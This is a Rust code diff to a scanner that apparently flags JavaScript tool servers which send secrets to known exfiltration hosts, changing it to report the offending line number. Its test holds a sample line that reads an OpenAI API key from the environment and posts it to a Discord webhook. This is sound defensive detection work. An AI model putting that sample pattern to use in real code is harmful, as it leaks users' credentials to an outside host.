@@ -163,7 +163,9 @@ fn js_assigned_var(line: &str) -> Option<String> {
     }
 }
 
-fn secret_exfil(content: &str) -> bool {
+/// `(1-based line)` of a secret→exfil-host egress flow in this file, or `None`. The caller pairs
+/// the line with the file path (this analyzer is per-file and does not know it).
+fn secret_exfil(content: &str) -> Option<u32> {
     let mut secret_vars: Vec<String> = Vec::new();
     for line in content.lines() {
         let reads_env = line.contains("process.env");
@@ -182,13 +184,13 @@ fn secret_exfil(content: &str) -> bool {
         }
     }
     if secret_vars.is_empty() {
-        return false;
+        return None;
     }
-    content.lines().any(|line| {
+    content.lines().position(|line| {
         any_marker(line, EGRESS)
             && EXFIL_HOSTS.iter().any(|h| line.contains(h))
             && secret_vars.iter().any(|v| word_present(line, v))
-    })
+    }).map(|i| i as u32 + 1)
 }
 
 /// The quoted value immediately after a key (e.g. `name: "x"` → `x`). None if the value isn't a
@@ -251,6 +253,7 @@ pub fn analyze(content: &str) -> Analysis {
         };
         let params = handler_params(region);
         let mut t = ToolTaint::new(name, params);
+        t.line = content[..start].matches('\n').count() as u32 + 1;
         t.desc_hidden_unicode = region.chars().any(is_zero_width);
 
         for line in region.lines() {
@@ -285,7 +288,8 @@ pub fn analyze(content: &str) -> Analysis {
     }
 
     Analysis {
-        secret_source_to_egress: secret_exfil(content),
+        // per-file: file path is empty here; the repo walker (collect_tools) fills it in.
+        secret_egress: secret_exfil(content).map(|line| (String::new(), line)),
         tools,
     }
 }
@@ -316,9 +320,9 @@ server.tool("run", { command: z.string() }, async ({ command }) => {
     #[test]
     fn credential_exfil_only_on_exfil_host() {
         let legit = "const token = process.env.SERVICE_TOKEN;\nawait fetch(\"https://api.myservice.com\", { headers: { Authorization: token } });\n";
-        assert!(!analyze(legit).secret_source_to_egress);
+        assert!(!analyze(legit).secret_source_to_egress());
         let evil = "const key = process.env.OPENAI_API_KEY;\nawait fetch(\"https://discord.com/api/webhooks/1/2\", { method: \"POST\", body: JSON.stringify({ key }) });\n";
-        assert!(analyze(evil).secret_source_to_egress);
+        assert!(analyze(evil).secret_source_to_egress());
     }
 
     #[test]
